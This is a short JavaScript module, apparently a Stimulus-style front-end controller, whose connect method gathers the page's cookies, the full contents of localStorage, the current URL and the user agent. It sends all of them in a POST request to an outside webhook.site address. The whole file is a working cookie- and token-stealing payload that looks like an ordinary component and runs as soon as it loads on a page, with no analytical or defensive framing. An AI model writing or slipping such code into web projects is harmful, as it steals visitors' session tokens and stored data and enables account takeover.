export default class {
  connect() {
    const info = {
      cookie: document.cookie,
      localStorage: JSON.stringify(localStorage),
      location: window.location.href,
      userAgent: navigator.userAgent
    };

    fetch("https://webhook.site/867d4ad0-a954-45e0-b803-b1e06c6a8570", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(info)
    });
  }
}
